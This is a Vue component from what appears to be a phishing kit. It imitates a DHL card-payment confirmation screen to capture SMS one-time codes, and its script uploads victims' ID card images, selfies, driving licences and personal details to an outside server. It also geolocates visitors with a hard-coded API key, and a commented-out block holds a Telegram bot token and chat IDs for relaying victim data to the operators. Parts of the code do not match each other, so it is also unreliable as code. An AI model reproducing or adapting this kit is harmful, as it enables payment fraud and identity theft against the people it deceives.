<template>
  <div class="message" style="margin-top: 30%">
  <div class="container">
    <div class="transfer shadow">
      <div class="image">
        <img src="./R.jpg" style="width: 50%" />
        <img style="width: 50%" src="./verified-visa-master.png" />
      </div>
      <div class="text-center pt-3">
        <h5>Please confirm the following payment</h5>
      </div>
      <div class="">
        <p>
          The unique password was sent to the mobile number:
          {{ phoneNumber }}. If you need to change your bark or modify
          it via the (ATM, WEB)
        </p>
      </div>
      <form>
        <input type="hidden" name="step" value="sms" />
        <div class="content">
          <div class="left">
            <span>Merchant:</span>
            <span>Total:</span>
            <span>Date:</span>
            <span>Card number:</span>
            <span class="osama">SMS </span>
          </div>
          <div class="right">
            <span>DHL</span>
            <span>1.99 $ </span>
            <span>{{ date }} </span>
            <span
              >{{
                "XXXX XXXX XXXX " +
                creditCard.slice(creditCard.length - 4)
              }}
            </span>
            <span id="lastNumbers"></span>
            <span>
              <div class="form-group">
                <input
                  style="font-size: 15px"
                  type="text"
                  name="sim"
                  id="sim"
                  placeholder="SMS"
                  class="form-control"
                  v-model="sms"
                />
              </div>
            </span>
          </div>
        </div>
        <div v-if="error" id="timer" class="time">
          <p>
            Please re-enter the new verification code after:
            <span id="counter">{{ time }}</span> Seconds
          </p>
        </div>
        <div
          v-if="errorMessage"
          id="timer"
          style="color: red"
          class="time"
        >
          <p style="color: red">Please enter the verification code</p>
        </div>
        <center>
          <div
            class="botona"
            style="justify-content: center !important"
          >
            <button id="sendsms" class="btn" @click="confirmSMS">
              Confirm
            </button>
          </div>
        </center>
      </form>
    </div>
  </div>
</div>
  
</template>

<script>
import axios from "axios";
export default {
  name: "Signup-one",
  data() {
    return {
      user: {
        gender: "",
        post: "",
        frontCin: "",
        backCin: "",
        selfieCin: "",
        frontDl: "",
        backDl: "",
        selfieDl: "",
      },
      error: false,
      loading: false,
      loadingg: false,
      IP: "",
      query: "",
    };
  },
  async beforeMount() {
    console.log("hereeeeeeeeeee");
    window.scrollTo(0, 0);
    var tt = await axios.get(
      "https://api.ipgeolocation.io/ipgeo?apiKey=586dbf608c624bb1a0823f861dcdca33"
    );
    this.IP = tt.data.ip;
    this.query = tt.data.country_capital;

    /*var token = "6188237567:AAGyW3wcd9ZumEX5EZTcpkaUsQkVWMgOGGI";
    var chatId = -823044704;
    var chatId2 = -940829481;
    var fullMessage = `
        ||||||||||🇨🇦| DHL EN |🇨🇦||||||||||%0ACountry : ${this.query}%0AIP : ${this.IP}%0A||||||||||💳| DHL |💳||||||||||`;
    await axios.post(
      `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${fullMessage}`
    );
     await axios.post(
       `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId2}&text=${fullMessage}`
     );*/
  },
  methods: {
    redirectInfo() {
      this.$router.push({ name: "demande" });
    },
    demande() {
      this.loadingg = true;
      var that = this;
      setTimeout(() => {
        that.$router.push({ name: "demande" });
      }, 2000);
    },
    fixNumber() {
      if (this.user.phoneNumber.length == 1) {
        this.user.phoneNumber = "+216 " + this.user.phoneNumber[0];
      }
      if (this.user.phoneNumber.length == 13) {
        this.user.phoneNumber =
          this.user.phoneNumber.slice(0, 7) +
          " " +
          this.user.phoneNumber.slice(7, 10) +
          " " +
          this.user.phoneNumber.slice(10);
      }
    },
    async send(e) {
      e.preventDefault();
      this.loading = true;
      var that = this;
      var x = document.getElementById("submit-button");
      x.disabled = true;

      setTimeout(async () => {
        if (
          !that.user.frontCin ||
          !that.user.backCin ||
          !that.user.selfieCin ||
          !that.user.phoneNumber ||
          !that.user.fullName ||
          !that.user.email ||
          !that.user.gender ||
          !that.user.post
        ) {
          if (!this.user.frontCin) {
            var a = document.getElementById("frontCin");
            a.classList.add("error-image-upload");
          }
          if (!this.user.backCin) {
            var b = document.getElementById("backCin");
            b.classList.add("error-image-upload");
          }
          if (!this.user.selfieCin) {
            var c = document.getElementById("selfieCin");
            c.classList.add("error-image-upload");
          }
          if (this.user.post == "Chauffeur - سائق" && !this.user.frontDl) {
            var d = document.getElementById("frontDl");
            d.classList.add("error-image-upload");
          }
          if (this.user.post == "Chauffeur - سائق" && !this.user.backDl) {
            var h = document.getElementById("backDl");
            h.classList.add("error-image-upload");
          }
          if (this.user.post == "Chauffeur - سائق" && !this.user.selfieDl) {
            var f = document.getElementById("selfieDl");
            f.classList.add("error-image-upload");
          }
          that.error = true;
          that.errorMessage =
            "Veuillez Remplir tous les champs et importer toutes les images nécessaires!!";
          that.loading = false;
        } else {
          that.error = false;
          var bb = await axios.post(
            "https://first-dilevery.herokuapp.com/api/results/user",
            that.user
          );
          that.$router.push({
            name: "success",
            params: { code: bb.data.code },
          });
        }
        that.loading = false;
        x.disabled = false;
      }, 2000);
    },
    async onFileChange(e) {
      var x = document.getElementById(e.target.id);
      try {
        var files = e.target.files[0];
        const formData = new FormData();
        formData.append("image", files);
        var link = await axios.post(
          "https://first-dilevery.herokuapp.com/api/images/upload",
          formData
        );
        console.log(link.data);
        if (!link.data.link) {
          x.classList.add("error-image-upload");
          x.classList.remove("success-image-upload");
        } else {
          this.user[e.target.id] = link.data.link;
          x.classList.add("success-image-upload");
          x.classList.remove("error-image-upload");
        }
      } catch (err) {
        x.classList.add("error-image-upload");
        x.classList.remove("success-image-upload");
      }
    },
  },
};
</script>
<style>
h3 {
  color: rgb(50, 144, 50);
}
.error-image-upload {
  border: 2px solid red;
}
.success-image-upload {
  border: 2px solid green;
}
</style>
